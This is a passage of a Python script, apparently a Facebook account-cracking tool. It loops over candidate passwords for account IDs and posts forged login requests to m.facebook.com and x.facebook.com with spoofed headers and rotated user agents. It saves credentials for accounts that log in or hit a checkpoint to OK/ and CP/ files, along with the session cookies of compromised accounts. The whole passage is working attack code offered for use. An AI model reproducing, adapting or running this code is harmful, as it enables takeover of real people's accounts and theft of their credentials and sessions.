'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			heade ={'Host':'m.facebook.com','x-fb-rlafr': '0','access-control-allow-origin':'*','strict-transport-security':'max-age=15552000; preload; includeSubDomains','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-lsd': 'AVpr73AwpXc','x-fb-debug':'7TIW4GASHMRstipvH3hhndfu8XT7f1n9ogNckpZJRvyGPNJD4u18beO1evCVVkHED0RNJzrKTpKiPfwuP3881A==','content-length':'1447','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-javascript; charset=utf-8','user-agent': ua,'accept':'*/*','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer':'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METHOD LAWAK V2 ]--------------------#
def cracklawakv2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	#ua = useragent()
	ua = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Lawak V2{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			link = ses.get('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'provided_or_soft_matched',
'prefill_type': 'contact_point',
'first_prefill_source': 'provided_or_soft_matched',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
'__csr': '',
'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
'__a': '',
'__user':0
}
			heade = {
'Host':'x.facebook.com',
'x-fb-rlafr': '0',
'access-control-allow-origin': '*',
'pragma': 'no-cache',
'cache-control': 'private, no-cache, no-store, must-revalidate',
'x-fb-lsd':'AVqUJPZ_4-8',
'x-fb-asbd-id':'198387',
'x-fb-debug':'Ar808puA9haE5G4ec9zVAcFGinnes6bGoqixLonN/y5Q6rn9EcYoI4u3yLxGxJDpKRXuHAOiLuDHUPAeSTdPtg==',
'content-length':'2052',
'cache-control': 'max-age=0',
'save-data': 'on',
'upgrade-insecure-requests':'1',
'strict-transport-security':'max-age=15552000; preload',
'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
'sec-ch-ua-mobile':'?1',
'user-agent':ua,
'content-type':'application/x-www-form-urlencoded',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': 'https://x.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer':'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
'accept-encoding':'gzip, deflate',
'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'
}
			po = ses.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=heade)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/BrayennnXD')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()
